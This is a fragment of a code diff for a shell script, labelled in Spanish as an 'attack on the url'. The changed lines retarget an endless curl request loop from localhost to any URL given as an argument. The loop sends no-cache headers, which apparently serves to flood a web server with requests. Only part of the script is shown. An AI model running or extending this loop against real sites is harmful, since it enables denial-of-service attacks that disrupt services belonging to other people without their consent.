@@ -27,10 +27,12 @@ if [ -z "$1" ]; then
         exit 0
 fi
 echo
-echo
+echo "================================================="
+echo "Ataque sobre la url.: $1"
+echo "================================================="
 echo
 while : ; do
-      curl -v -I -k 'http://localhost' \
+      curl -v -I -k $1 \
 -H 'Connection: keep-alive' \
 -H 'Pragma: no-cache' \
 -H 'Cache-Control: no-cache' \
